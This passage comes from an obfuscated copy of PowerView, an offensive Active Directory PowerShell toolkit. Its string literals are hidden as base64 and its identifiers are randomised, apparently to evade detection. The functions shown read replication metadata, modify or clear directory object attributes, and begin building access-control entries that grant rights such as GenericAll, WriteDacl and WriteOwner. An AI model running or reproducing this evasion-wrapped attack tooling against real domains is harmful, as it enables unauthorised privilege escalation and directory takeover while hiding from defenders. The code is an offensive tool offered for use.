                    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAE8AYgBqAGUAYwB0AEEAdAB0AHIAaQBiAHUAdABlAEgAaQBzAHQAbwByAHkAXQAgAEUAcgByAG8AcgAgAHIAZQB0AHIAaQBlAHYAaQBuAGcAIAAnAG0AcwBkAHMALQByAGUAcABsAGEAdAB0AHIAaQBiAHUAdABlAG0AZQB0AGEAZABhAHQAYQAnACAAZgBvAHIAIAAnACQAewA1AGMAOQBlADQAYgBlAGYAYgBkADcAMAA0ADUAMgA3ADgAYwA2ADQAOQBkAGYAMQBlADIAMwBlADEAZABjADgAfQAnAA==')))
                }
            }
        }
    }
}
function Get-DomainObjectLinkedAttributeHistory {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.ADObjectLinkedAttributeHistory')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $Identity,
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Switch]
        $Tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    BEGIN {
        ${afd7d337a750465cb1eadfa1f8ae176d} = @{
            'Properties'    =   $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAGQAcwAtAHIAZQBwAGwAdgBhAGwAdQBlAG0AZQB0AGEAZABhAHQAYQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlAA==')))
            'Raw'           =   $True
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $LDAPFilter }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))]) {
            ${215b02075a644ff7b2e4df9faac88a32} = $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))] -Join '|'
        }
        else {
            ${215b02075a644ff7b2e4df9faac88a32} = ''
        }
    }
    PROCESS {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = $Identity }
        dc2f41a670d5455b8f64f106e1b09449 @afd7d337a750465cb1eadfa1f8ae176d | ForEach-Object {
            ${5c9e4befbd7045278c649df1e23e1dc8} = $_.Properties[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlAA==')))][0]
            ForEach(${6981d33ed3264afe8f122b1054b2eeee} in $_.Properties[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAGQAcwAtAHIAZQBwAGwAdgBhAGwAdQBlAG0AZQB0AGEAZABhAHQAYQA=')))]) {
                ${2d1b3fbce869492e9d8fa38d2a2dc474} = [xml]${6981d33ed3264afe8f122b1054b2eeee} | Select-Object -ExpandProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABTAF8AUgBFAFAATABfAFYAQQBMAFUARQBfAE0ARQBUAEEAXwBEAEEAVABBAA=='))) -ErrorAction SilentlyContinue
                if (${2d1b3fbce869492e9d8fa38d2a2dc474}) {
                    if (${2d1b3fbce869492e9d8fa38d2a2dc474}.pszAttributeName -Match ${215b02075a644ff7b2e4df9faac88a32}) {
                        ${b01c344f140447efaf17619a650a69ed} = New-Object PSObject
                        ${b01c344f140447efaf17619a650a69ed} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQARABOAA=='))) ${5c9e4befbd7045278c649df1e23e1dc8}
                        ${b01c344f140447efaf17619a650a69ed} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB0AHQAcgBpAGIAdQB0AGUATgBhAG0AZQA='))) ${2d1b3fbce869492e9d8fa38d2a2dc474}.pszAttributeName
                        ${b01c344f140447efaf17619a650a69ed} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB0AHQAcgBpAGIAdQB0AGUAVgBhAGwAdQBlAA=='))) ${2d1b3fbce869492e9d8fa38d2a2dc474}.pszObjectDn
                        ${b01c344f140447efaf17619a650a69ed} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABpAG0AZQBDAHIAZQBhAHQAZQBkAA=='))) ${2d1b3fbce869492e9d8fa38d2a2dc474}.ftimeCreated
                        ${b01c344f140447efaf17619a650a69ed} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABpAG0AZQBEAGUAbABlAHQAZQBkAA=='))) ${2d1b3fbce869492e9d8fa38d2a2dc474}.ftimeDeleted
                        ${b01c344f140447efaf17619a650a69ed} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABhAHMAdABPAHIAaQBnAGkAbgBhAHQAaQBuAGcAQwBoAGEAbgBnAGUA'))) ${2d1b3fbce869492e9d8fa38d2a2dc474}.ftimeLastOriginatingChange
                        ${b01c344f140447efaf17619a650a69ed} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBlAHIAcwBpAG8AbgA='))) ${2d1b3fbce869492e9d8fa38d2a2dc474}.dwVersion
                        ${b01c344f140447efaf17619a650a69ed} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABhAHMAdABPAHIAaQBnAGkAbgBhAHQAaQBuAGcARABzAGEARABOAA=='))) ${2d1b3fbce869492e9d8fa38d2a2dc474}.pszLastOriginatingDsaDN
                        ${b01c344f140447efaf17619a650a69ed}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBBAEQATwBiAGoAZQBjAHQATABpAG4AawBlAGQAQQB0AHQAcgBpAGIAdQB0AGUASABpAHMAdABvAHIAeQA='))))
                        ${b01c344f140447efaf17619a650a69ed}
                    }
                }
                else {
                    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAE8AYgBqAGUAYwB0AEwAaQBuAGsAZQBkAEEAdAB0AHIAaQBiAHUAdABlAEgAaQBzAHQAbwByAHkAXQAgAEUAcgByAG8AcgAgAHIAZQB0AHIAaQBlAHYAaQBuAGcAIAAnAG0AcwBkAHMALQByAGUAcABsAHYAYQBsAHUAZQBtAGUAdABhAGQAYQB0AGEAJwAgAGYAbwByACAAJwAkAHsANQBjADkAZQA0AGIAZQBmAGIAZAA3ADAANAA1ADIANwA4AGMANgA0ADkAZABmADEAZQAyADMAZQAxAGQAYwA4AH0AJwA=')))
                }
            }
        }
    }
}
function Set-DomainObject {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        $Identity,
        [ValidateNotNullOrEmpty()]
        [Alias('Replace')]
        [Hashtable]
        $Set,
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $XOR,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Clear,
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Switch]
        $Tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        ${afd7d337a750465cb1eadfa1f8ae176d} = @{'Raw' = $True}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $LDAPFilter }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
    }
    PROCESS {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = $Identity }
        ${9171096ca29742bdb84aad9e9406f3c6} = dc2f41a670d5455b8f64f106e1b09449 @afd7d337a750465cb1eadfa1f8ae176d
        ForEach ($Object in ${9171096ca29742bdb84aad9e9406f3c6}) {
            ${d52add069fcb40558b75c2b54ec44ab4} = ${9171096ca29742bdb84aad9e9406f3c6}.GetDirectoryEntry()
            if($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHQA')))]) {
                try {
                    $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHQA')))].GetEnumerator() | ForEach-Object {
                        Write-Verbose "[Set-DomainObject] Setting '$($_.Name)' to '$($_.Value)' for object '$(${9171096ca29742bdb84aad9e9406f3c6}.Properties.samaccountname)'"
                        ${d52add069fcb40558b75c2b54ec44ab4}.put($_.Name, $_.Value)
                    }
                    ${d52add069fcb40558b75c2b54ec44ab4}.commitchanges()
                }
                catch {
                    Write-Warning "[Set-DomainObject] Error setting/replacing properties for object '$(${9171096ca29742bdb84aad9e9406f3c6}.Properties.samaccountname)' : $_"
                }
            }
            if($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WABPAFIA')))]) {
                try {
                    $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WABPAFIA')))].GetEnumerator() | ForEach-Object {
                        ${7fd618c6f090480b87e50c345d9fb5c8} = $_.Name
                        ${d0dd55834534469aa65e5f38923bc760} = $_.Value
                        Write-Verbose "[Set-DomainObject] XORing '${7fd618c6f090480b87e50c345d9fb5c8}' with '${d0dd55834534469aa65e5f38923bc760}' for object '$(${9171096ca29742bdb84aad9e9406f3c6}.Properties.samaccountname)'"
                        ${0b9ea0172f084343a14067116dc58854} = ${d52add069fcb40558b75c2b54ec44ab4}.${7fd618c6f090480b87e50c345d9fb5c8}[0].GetType().name
                        ${7b4f740bf78d45c2b03f50d1812d6aed} = $(${d52add069fcb40558b75c2b54ec44ab4}.${7fd618c6f090480b87e50c345d9fb5c8}) -bxor ${d0dd55834534469aa65e5f38923bc760}
                        ${d52add069fcb40558b75c2b54ec44ab4}.${7fd618c6f090480b87e50c345d9fb5c8} = ${7b4f740bf78d45c2b03f50d1812d6aed} -as ${0b9ea0172f084343a14067116dc58854}
                    }
                    ${d52add069fcb40558b75c2b54ec44ab4}.commitchanges()
                }
                catch {
                    Write-Warning "[Set-DomainObject] Error XOR'ing properties for object '$(${9171096ca29742bdb84aad9e9406f3c6}.Properties.samaccountname)' : $_"
                }
            }
            if($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBsAGUAYQByAA==')))]) {
                try {
                    $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBsAGUAYQByAA==')))] | ForEach-Object {
                        ${7fd618c6f090480b87e50c345d9fb5c8} = $_
                        Write-Verbose "[Set-DomainObject] Clearing '${7fd618c6f090480b87e50c345d9fb5c8}' for object '$(${9171096ca29742bdb84aad9e9406f3c6}.Properties.samaccountname)'"
                        ${d52add069fcb40558b75c2b54ec44ab4}.${7fd618c6f090480b87e50c345d9fb5c8}.clear()
                    }
                    ${d52add069fcb40558b75c2b54ec44ab4}.commitchanges()
                }
                catch {
                    Write-Warning "[Set-DomainObject] Error clearing properties for object '$(${9171096ca29742bdb84aad9e9406f3c6}.Properties.samaccountname)' : $_"
                }
            }
        }
    }
}
function ConvertFrom-LDAPLogonHours {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.LogonHours')]
    [CmdletBinding()]
    Param (
        [Parameter( ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [byte[]]
        $LogonHoursArray
    )
    Begin {
        if($LogonHoursArray.Count -ne 21) {
            throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGcAbwBuAEgAbwB1AHIAcwBBAHIAcgBhAHkAIABpAHMAIAB0AGgAZQAgAGkAbgBjAG8AcgByAGUAYwB0ACAAbABlAG4AZwB0AGgA')))
        }
        function a94140f6e5dd4c3d98e174ada7006028 {
            Param (
                [int[]]
                ${de0dce8f21b94696aaedd12f31a5d06f}
            )
            ${047d57c20db44b2cb9d4f8a9a626b446} = New-Object bool[] 24
            for(${35c58f1556d947ac8053e2f546574b9e}=0; ${35c58f1556d947ac8053e2f546574b9e} -lt 3; ${35c58f1556d947ac8053e2f546574b9e}++) {
                ${8acd8690baf044af81a8331e90025168} = ${de0dce8f21b94696aaedd12f31a5d06f}[${35c58f1556d947ac8053e2f546574b9e}]
                ${b80d9562f792404db0205d365e956f5e} = ${35c58f1556d947ac8053e2f546574b9e} * 8
                ${43ee80f3e6094973a1f9695bcffc82c7} = [Convert]::ToString(${8acd8690baf044af81a8331e90025168},2).PadLeft(8,'0')
                ${047d57c20db44b2cb9d4f8a9a626b446}[${b80d9562f792404db0205d365e956f5e}+0] = [bool] [convert]::ToInt32([string]${43ee80f3e6094973a1f9695bcffc82c7}[7])
                ${047d57c20db44b2cb9d4f8a9a626b446}[${b80d9562f792404db0205d365e956f5e}+1] = [bool] [convert]::ToInt32([string]${43ee80f3e6094973a1f9695bcffc82c7}[6])
                ${047d57c20db44b2cb9d4f8a9a626b446}[${b80d9562f792404db0205d365e956f5e}+2] = [bool] [convert]::ToInt32([string]${43ee80f3e6094973a1f9695bcffc82c7}[5])
                ${047d57c20db44b2cb9d4f8a9a626b446}[${b80d9562f792404db0205d365e956f5e}+3] = [bool] [convert]::ToInt32([string]${43ee80f3e6094973a1f9695bcffc82c7}[4])
                ${047d57c20db44b2cb9d4f8a9a626b446}[${b80d9562f792404db0205d365e956f5e}+4] = [bool] [convert]::ToInt32([string]${43ee80f3e6094973a1f9695bcffc82c7}[3])
                ${047d57c20db44b2cb9d4f8a9a626b446}[${b80d9562f792404db0205d365e956f5e}+5] = [bool] [convert]::ToInt32([string]${43ee80f3e6094973a1f9695bcffc82c7}[2])
                ${047d57c20db44b2cb9d4f8a9a626b446}[${b80d9562f792404db0205d365e956f5e}+6] = [bool] [convert]::ToInt32([string]${43ee80f3e6094973a1f9695bcffc82c7}[1])
                ${047d57c20db44b2cb9d4f8a9a626b446}[${b80d9562f792404db0205d365e956f5e}+7] = [bool] [convert]::ToInt32([string]${43ee80f3e6094973a1f9695bcffc82c7}[0])
            }
            ${047d57c20db44b2cb9d4f8a9a626b446}
        }
    }
    Process {
        ${b01c344f140447efaf17619a650a69ed} = @{
            Sunday = a94140f6e5dd4c3d98e174ada7006028 -de0dce8f21b94696aaedd12f31a5d06f $LogonHoursArray[0..2]
            Monday = a94140f6e5dd4c3d98e174ada7006028 -de0dce8f21b94696aaedd12f31a5d06f $LogonHoursArray[3..5]
            Tuesday = a94140f6e5dd4c3d98e174ada7006028 -de0dce8f21b94696aaedd12f31a5d06f $LogonHoursArray[6..8]
            Wednesday = a94140f6e5dd4c3d98e174ada7006028 -de0dce8f21b94696aaedd12f31a5d06f $LogonHoursArray[9..11]
            Thurs = a94140f6e5dd4c3d98e174ada7006028 -de0dce8f21b94696aaedd12f31a5d06f $LogonHoursArray[12..14]
            Friday = a94140f6e5dd4c3d98e174ada7006028 -de0dce8f21b94696aaedd12f31a5d06f $LogonHoursArray[15..17]
            Saturday = a94140f6e5dd4c3d98e174ada7006028 -de0dce8f21b94696aaedd12f31a5d06f $LogonHoursArray[18..20]
        }
        ${b01c344f140447efaf17619a650a69ed} = New-Object PSObject -Property ${b01c344f140447efaf17619a650a69ed}
        ${b01c344f140447efaf17619a650a69ed}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBMAG8AZwBvAG4ASABvAHUAcgBzAA=='))))
        ${b01c344f140447efaf17619a650a69ed}
    }
}
function New-ADObjectAccessControlEntry {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.Security.AccessControl.AuthorizationRule')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True, Mandatory = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String]
        $PrincipalIdentity,
        [ValidateNotNullOrEmpty()]
        [String]
        $PrincipalDomain,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Switch]
        $Tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,
        [Parameter(Mandatory = $True)]
        [ValidateSet('AccessSystemSecurity', 'CreateChild','Delete','DeleteChild','DeleteTree','ExtendedRight','GenericAll','GenericExecute','GenericRead','GenericWrite','ListChildren','ListObject','ReadControl','ReadProperty','Self','Synchronize','WriteDacl','WriteOwner','WriteProperty')]
        $Right,
        [Parameter(Mandatory = $True, ParameterSetName='AccessRuleType')]
        [ValidateSet('Allow', 'Deny')]
        [String[]]
        $AccessControlType,
        [Parameter(Mandatory = $True, ParameterSetName='AuditRuleType')]
        [ValidateSet('Success', 'Failure')]
        [String]
        $AuditFlag,
        [Parameter(Mandatory = $False, ParameterSetName='AccessRuleType')]
        [Parameter(Mandatory = $False, ParameterSetName='AuditRuleType')]
        [Parameter(Mandatory = $False, ParameterSetName='ObjectGuidLookup')]
        [Guid]
        $ObjectType,
        [ValidateSet('All', 'Children','Descendents','None','SelfAndChildren')]
        [String]
        $InheritanceType,
        [Guid]
        $InheritedObjectType
    )
    Begin {
        if ($PrincipalIdentity -notmatch $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBTAC0AMQAtAC4AKgA=')))) {
            ${3353c7749a7e4809bab3bc9ad46447d5} = @{
                'Identity' = $PrincipalIdentity
                'Properties' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlACwAbwBiAGoAZQBjAHQAcwBpAGQA')))
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAbgBjAGkAcABhAGwARABvAG0AYQBpAG4A')))]) { ${3353c7749a7e4809bab3bc9ad46447d5}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $PrincipalDomain }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${3353c7749a7e4809bab3bc9ad46447d5}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${3353c7749a7e4809bab3bc9ad46447d5}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${3353c7749a7e4809bab3bc9ad46447d5}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${3353c7749a7e4809bab3bc9ad46447d5}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${3353c7749a7e4809bab3bc9ad46447d5}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${3353c7749a7e4809bab3bc9ad46447d5}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
            ${404fe06381724338825bde6aaf9ef9e4} = dc2f41a670d5455b8f64f106e1b09449 @3353c7749a7e4809bab3bc9ad46447d5
            if (-not ${404fe06381724338825bde6aaf9ef9e4}) {
                throw $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIAByAGUAcwBvAGwAdgBlACAAcAByAGkAbgBjAGkAcABhAGwAOgAgACQAUAByAGkAbgBjAGkAcABhAGwASQBkAGUAbgB0AGkAdAB5AA==')))
            }
            elseif(${404fe06381724338825bde6aaf9ef9e4}.Count -gt 1) {
